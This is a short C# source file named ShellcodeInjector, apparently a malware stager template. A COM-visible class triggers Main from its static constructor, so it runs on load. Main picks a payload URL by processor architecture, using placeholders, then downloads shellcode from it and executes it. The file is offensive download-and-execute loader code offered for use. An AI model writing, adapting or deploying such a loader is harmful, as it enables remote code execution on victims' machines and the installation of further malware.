using System;
using System.Runtime.InteropServices;

namespace ShellcodeInjector
{
    [ComVisible(true)]
    public class Program
    {
        static Program()
        {
            Main();
        }

        static void Main()
        {
            SYSTEM_INFO sysInfo;
            NativeImports.GetNativeSystemInfo(out sysInfo);

            string url;
            switch (sysInfo.wProcessorArchitecture)
            {
                case 12: // ARM64
                    url = "%URLARM64%";
                    break;
                case 9: // x64
                    url = "%URL64%";
                    break;
                default: // x86
                    url = "%URL32%";
                    break;
            }

            var payload = Downloader.DownloadFromUrl(url);
            ShellcodeRunner.RunPayload(payload, sysInfo.wProcessorArchitecture);
        }
    }
}
